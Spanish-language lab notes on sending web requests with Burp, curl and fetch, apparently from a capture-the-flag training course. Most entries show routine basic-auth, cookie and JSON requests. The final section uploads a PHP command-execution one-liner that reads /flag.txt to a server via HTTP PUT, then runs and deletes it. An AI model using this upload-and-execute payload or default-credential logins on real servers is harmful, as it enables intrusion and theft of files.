# Web Requests

## Solicitud GET con autorización básica
  
### Burp
  
```http
GET / HTTP/1.1
Host: 178.62.99.223:31738
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

### Curl

- Forma 1

```
curl http://178.62.99.223:31738/ -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' -L
```

- Forma 2
  
```bash
curl -u admin:password http://178.62.99.223:31738/  -L
```

```
curl -u admin:password -L http://178.62.99.223:31738/flag.php\?num1=1336\&num2=1
```

. Otro ejmplo
```
curl -i -X POST -d "username=admin&password=admin" http://83.136.251.226:40683/ 
curl -i -X POST -b "PHPSESSID=f5bp876aeecdt75d0t16k22fvl" http://83.136.251.226:40683
curl -i -X POST -b "PHPSESSID=f5bp876aeecdt75d0t16k22fvl"  -d '{"search":"flag"}' -H 'Content-Type: application/json' http://83.136.251.226:40683/search.php

await fetch("http://83.136.251.226:40683/search.php", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Curl",
        "Accept": "*/*",
        "Accept-Language": "es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Content-Type": "application/json",
        "Priority": "u=1"
    },
    "referrer": "http://83.136.251.226:40683/",
    "body": "{\"search\":\"flag\"}",
    "method": "POST",
    "mode": "cors"
});

```


## Solicitud POST

- Curl POST con cookie
  
```
curl -d 'username=admin&password=password' http://157.245.35.236:32721/login.php  -L --cookie-jar /dev/nul
```

- Curl con cookie forma 2

```bash
curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt
curl --cookie cookies.txt http://inlanefreight.com/admin/dashboard.php -v
```



- Curl POST Json

```
curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'
```

```bash
curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }' --cookie-jar /dev/null -L  http://inlanefreight.com/login.php
```

### OPTIONS, PUT, DELETE

- curl OPTIONS
  
```bash
curl -X OPTIONS http://157.245.35.236:30885 -I
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Wed, 12 Jan 2022 04:06:21 GMT
Content-Length: 0
Connection: keep-alive
DAV: 1
Allow: GET,HEAD,PUT,DELETE,MKCOL,COPY,MOVE,PROPFIND,OPTIONS
```

- subir archivo
  
```bash
echo '<?=`cat /flag.txt`;?>' > flag.php
curl -X PUT http://157.245.35.236:30885/flag.php -d @flag.php -vv
curl http://157.245.35.236:30885/flag.php -vv 
```

- borrar archivo

```bash
curl -X DELETE http://157.245.35.236:30885/flag.php  -vv 
```



